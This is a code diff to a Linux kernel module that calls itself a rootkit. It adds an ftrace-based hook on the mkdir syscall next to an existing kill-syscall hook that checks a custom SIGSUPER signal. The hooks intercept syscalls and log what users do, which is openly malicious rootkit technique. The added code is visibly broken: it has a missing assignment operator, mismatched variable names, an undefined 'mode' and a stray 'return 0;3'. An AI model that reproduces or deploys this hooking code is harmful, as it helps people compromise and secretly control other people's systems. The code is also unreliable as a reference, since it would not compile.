@@ -22,11 +22,19 @@ unsigned long *__sys_call_table = NULL;
  allowed to be called form the kernel*/
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
 #define PTREGS_SYSCALL_STUB 1
+/* kill */
 typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
 static ptregs_t orig_kill;
+/* mkdir */
+typedef asmlinkage long (*ptregs_t)(const struct pt_regs *);
+static ptregs_t orig_mkdir;
 #else
+/* kill */
 typedef asmlinkage long (*orig_kill_t)(pid_t pid, int sig);
 static orig_kill_t orig_kill;
+/* mkdir */
+typedef asmlinkage long(*orig_mkdir_t)(const char __user *pathname, umode_t mode);
+static orig_mkdir_t orig_mkdir;
 #endif
 #endif
 
@@ -52,6 +60,21 @@ static asmlinkage long hook_kill(const struct pt_regs *regs){
     return orig_kill(regs);
 }
 
+static asmlinkage int hook_mkdir(const struct pt_regs *regs){
+    char __user *pathname = (char *)regs->di;
+    char dirname[NAME_MAX] = {0};
+
+    long error strncpy_from_user(dir_name, pathname, NAME_MAX);
+
+    if(error > 0){
+        printk(KERN_INFO "rootkit: trying to create directory with name : %s\n", dir_name);
+    }
+    printk(KERN_INFO "***** hacked mkdir syscall *****\n");
+
+    orig_mkdir(pathname, mode);
+    return 0;
+}
+
 #else
 static asmlinkage long hook_kill(pid_t pid, int sig){
     if(sig == SIGSUPER){
@@ -66,8 +89,27 @@ static asmlinkage long hook_kill(pid_t pid, int sig){
 
     return orig_kill(regs);
 }
+
+static asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode){
+
+    char dirname[NAME_MAX] = {0};
+
+    long error strncpy_from_user(dir_name, pathname, NAME_MAX);
+
+    if(error > 0){
+        printk(KERN_INFO "rootkit: trying to create directory with name : %s\n", dir_name);
+    }
+    printk(KERN_INFO "***** hacked mkdir syscall *****\n");
+
+    orig_mkdir(pathname, mode);
+    return 0;3
+}
 #endif
 
+//Older way to do the cleanup and hooking the ftrace functions are much easier
+/**
+ * for clearn up after the syscall
+*/
 // static int cleanup(void){
 //     /* kill */
 //     __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
@@ -149,6 +191,7 @@ static unsigned long *get_syscall_table(void){
 
 static struct ftrace_hook hooks[] = {
     HOOK("sys_kill", hook_kill, &orig_kill),
+    HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
 };
 
 /**
